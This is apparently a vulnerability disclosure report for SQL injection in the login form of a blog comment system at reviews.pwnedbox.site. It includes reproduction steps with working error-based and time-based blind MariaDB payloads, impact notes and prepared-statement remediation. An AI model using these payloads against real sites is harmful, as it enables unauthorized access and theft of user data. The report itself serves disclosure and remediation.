## Title
SQL Injection – POST Parameter (`email`) in Comment System Login at `reviews.pwnedbox.site`

## Description
**Affected URL:** https://reviews.pwnedbox.site/
A SQL Injection vulnerability exists in the `email` POST parameter of the "Login to Discussion" form on the DevCommunity blog platform at `https://reviews.pwnedbox.site/index.php`. User input is passed unsanitized into a MariaDB query, enabling both error-based and time-based blind SQL injection via the comment system's authentication endpoint.

**Affected Parameter:** `email` (POST body)  
**Method:** POST  
**Injection Point:** "Login to Discussion" modal (comment system login)  
**Backend Database:** MariaDB  
**Server Stack:** LAMPP  
**Vulnerable File:** `/opt/lampp/htdocs/subdomains/reviews/index.php

## Steps to Reproduce
1. Navigate to any article on `https://reviews.pwnedbox.site/index.php` and click **Login** in the comment/discussion section.
2. Enter a single quote in the email field to trigger an error:
   ```
   Email: test@gmail.com'
   Password: anything
   ```
   → Application throws a fatal SQL error leaking DB type, server path, and line number.

3. Inject a time-based payload via Burp Repeater:
   ```
   action=login&email=1'XOR(94102*if(now()=sysdate(),sleep(5),0))XOR'Z&password=safsfdasfa
   ```
   → Response delayed by ~5 seconds, confirming blind SQL injection.

4. Confirm with 10-second sleep via Burp Intruder:
   ```
   email=1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
   ```
   → Response time: **10,534 ms** (10-second delay confirmed).

5. Confirm arithmetic execution with multiplied sleep:
   ```
   email='XOR(if(now()=sysdate(),sleep(5*5),0))OR'
   ```
   → Request timed out (25-second sleep confirmed).

## POC (Proof of Concept)
<img width="1918" height="1027" alt="a" src="https://github.com/user-attachments/assets/260e70f0-27e9-4e21-8972-b546fce7032f" />
<img width="1918" height="1026" alt="b" src="https://github.com/user-attachments/assets/78772265-b500-49c4-8965-766ec0f84781" />
<img width="1911" height="1022" alt="c" src="https://github.com/user-attachments/assets/1df51747-f385-4529-ad64-1532d86c0f48" />
<img width="1918" height="1027" alt="d" src="https://github.com/user-attachments/assets/f4767a09-697a-4fd1-9f60-aec9e0a4dd2c" />

## Impact
- **Authentication Bypass** – Login query can be manipulated to gain unauthorized access to user accounts in the comment/discussion system.
- **Data Exfiltration** – Full database contents (user credentials, comments, PII) can be extracted via blind techniques.
- **Comment Manipulation** – With DB access, an attacker could read, alter, or delete all user-submitted content.
- **Verbose Error Disclosure** – Stack trace exposes internal paths and query structure, aiding further exploitation.


## Remediation
1. **Use Prepared Statements** – Parameterize all queries; never concatenate user input.
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
   $stmt->execute([$_POST['email']]);
   ```

2. **Validate Input** – Enforce strict email format validation server-side before it reaches the query.

3. **Suppress Error Messages** – Set `display_errors = Off` in `php.ini` to prevent stack trace leakage in production.

4. **Least Privilege DB User** – Application DB account should only hold `SELECT/INSERT/UPDATE/DELETE` — no `FILE` or admin privileges.
